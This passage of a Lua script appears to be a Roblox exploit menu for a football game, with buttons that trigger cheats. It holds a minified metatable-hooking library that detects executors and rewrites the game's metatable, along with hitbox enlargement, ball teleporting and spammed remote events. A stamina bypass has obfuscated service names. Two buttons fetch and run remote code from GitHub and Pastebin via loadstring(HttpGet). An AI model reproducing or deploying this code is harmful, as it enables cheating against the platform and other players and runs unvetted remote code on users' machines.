p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Right Hand"]:AddPropertyEmulator("Size")
		game.Players.LocalPlayer.Character["Left Hand"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Right Arm"].Size = Vector3.new(5,5,5)
		game.Players.LocalPlayer.Character["Left Arm"].Size = Vector3.new(5,5,5)
		game.Players.LocalPlayer.Character["Right Arm"].Transparency = 0.9
		game.Players.LocalPlayer.Character["Left Arm"].Transparency = 0.9
	end)
end
coroutine.wrap(DTNR_fake_script)()
local function ILVXFM_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local Player = game.Players.LocalPlayer
		local Mouse = Player:GetMouse()
		Mouse.KeyDown:connect(function(catch)
			catch:lower()
			if catch == "f" then
				for i,balls in pairs(game.Workspace:GetDescendants()) do
					if balls.Name == "TPS" then
						balls.Position = Player.Character["HumanoidRootPart"].Position
					end
				end
			end
		end)
	end)
end
coroutine.wrap(ILVXFM_fake_script)()
local function REXTSH_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Head"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Head"].Size = Vector3.new(5,5,5)
		game.Players.LocalPlayer.Character["Head"].Transparency = 0.9
	end)
end
coroutine.wrap(REXTSH_fake_script)()
local function OAVARHV_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local args = {
			[1] = workspace.TPS,
			[2] = CFrame.new(Vector3.new(104.05304718018, 3.7450363636017, 144.50581359863), Vector3.new(-0, -0, -1)),
			[3] = Vector3.new(20.015998840332, 31.02379989624, 32.967914581299)
		}
	
		game:GetService("ReplicatedStorage").TPBall:FireServer(unpack(args))
	end)
end
coroutine.wrap(OAVARHV_fake_script)()
local function JTYHMX_fake_script() -- TextButton_6.LocalScript 
	local script = Instance.new('LocalScript', TextButton_6)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local args = {
			[1] = workspace.TPS,
			[2] = CFrame.new(Vector3.new(1014.05304718018, 33.7450363636017, 1444.50581359863), Vector3.new(-0, -0, -1)),
			[3] = Vector3.new(202.015998840332, 311.02379989624, 342.967914581299)
		}
	
		game:GetService("ReplicatedStorage").TPBall:FireServer(unpack(args))
	end)
end
coroutine.wrap(JTYHMX_fake_script)()
local function FRWE_fake_script() -- TextButton_7.LocalScript 
	local script = Instance.new('LocalScript', TextButton_7)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
				for i,balls in pairs(game.Lighting:GetDescendants()) do
					if balls.Name == "TPS" then
						game.ReplicatedStorage.CatchBall:FireServer(balls)
					end
		end
	end)
	
end
coroutine.wrap(FRWE_fake_script)()
local function XVKIRXB_fake_script() -- TextButton_8.LocalScript 
	local script = Instance.new('LocalScript', TextButton_8)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
				for i,balls in pairs(game.Lighting:GetDescendants()) do
			if balls.Name == "TPS" then
				while true do
					wait()
					game.ReplicatedStorage.CatchBall:FireServer(balls)
				end
			end
		end
	end)
	
end
coroutine.wrap(XVKIRXB_fake_script)()
local function IKONX_fake_script() -- TextButton_9.LocalScript 
	local script = Instance.new('LocalScript', TextButton_9)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		for i,balls in pairs(game.Lighting:GetDescendants()) do
			if balls.Name == "TPS" then
				game.ReplicatedStorage.CatchBall:FireServer(balls)
				wait()
				game.ReplicatedStorage.DropBall:FireServer(balls)
				end
			end
	end)
	
end
coroutine.wrap(IKONX_fake_script)()
local function PIEH_fake_script() -- TextButton_10.LocalScript 
	local script = Instance.new('LocalScript', TextButton_10)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Left Leg"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Left Leg"].Massless = true
		game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new (12.3, 2.11, 10.2)
		game.Players.LocalPlayer.Character["Left Leg"].Transparency = 0.9
	end)
	
end
coroutine.wrap(PIEH_fake_script)()
local function TXGR_fake_script() -- TextButton_11.LocalScript 
	local script = Instance.new('LocalScript', TextButton_11)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end)
	
end
coroutine.wrap(TXGR_fake_script)()
local function FNFNDRH_fake_script() -- TextButton_12.LocalScript 
	local script = Instance.new('LocalScript', TextButton_12)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local RunService = game:GetService("RunService")
		RunService.RenderStepped:connect(function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
		end)
		local e = game:GetService("\82\117\110\83\101\114\118\105\99\101") e.RenderStepped:connect(function() local c = game:GetService("\80\108\97\121\101\114\115").LocalPlayer.PlayerGui.Start.Points.StaminaBar c.Size = UDim2.new(0,200,0,3) c.Name = "" end)
	end)
	
end
coroutine.wrap(FNFNDRH_fake_script)()
local function LVXMBYW_fake_script() -- TextButton_13.LocalScript 
	local script = Instance.new('LocalScript', TextButton_13)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local RunService = game:GetService("RunService")
		RunService.RenderStepped:connect(function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
		end)
		local e = game:GetService("\82\117\110\83\101\114\118\105\99\101") e.RenderStepped:connect(function() local c = game:GetService("\80\108\97\121\101\114\115").LocalPlayer.PlayerGui.Start.Points.StaminaBar c.Size = UDim2.new(0,200,0,3) c.Name = "" end)
	end)
	
end
coroutine.wrap(LVXMBYW_fake_script)()
local function LZZTXN_fake_script() -- TextButton_14.LocalScript 
	local script = Instance.new('LocalScript', TextButton_14)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/KNUzQPYS", true))()
	end)
	
end
coroutine.wrap(LZZTXN_fake_script)()
local function EMTKDD_fake_script() -- TextButton_15.LocalScript 
	local script = Instance.new('LocalScript', TextButton_15)
script.Parent.ZIIndex = 10
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = true
		script.Parent.Parent.Parent.Credits.Visible = false
		script.Parent.Parent.Parent.Information.Visible = false
	end)
end
coroutine.wrap(EMTKDD_fake_script)()
local function SBMLZ_fake_script() -- TextButton_16.LocalScript 
	local script = Instance.new('LocalScript', TextButton_16)
script.Parent.ZIIndex = 10

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.Credits.Visible = true
		script.Parent.Parent.Parent.Information.Visible = false
	end)
end
coroutine.wrap(SBMLZ_fake_script)()
local function VWOX_fake_script() -- TextButton_17.LocalScript 
	local script = Instance.new('LocalScript', TextButton_17)
script.Parent.ZIIndex = 10
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.Credits.Visible = false
		script.Parent.Parent.Parent.Information.Visible = true
	end)
end
coroutine.wrap(VWOX_fake_script)()
local function RHGICX_fake_script() -- TextButton_18.LocalScript 
	local script = Instance.new('LocalScript', TextButton_18)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(RHGICX_fake_script)()
local function TEQIBW_fake_script() -- TextButton_19.LocalScript 
	local script = Instance.new('LocalScript', TextButton_19)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(TEQIBW_fake_script)()
local function AMOM_fake_script() -- TextButton_20.LocalScript 
	local script = Instance.new('LocalScript', TextButton_20)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
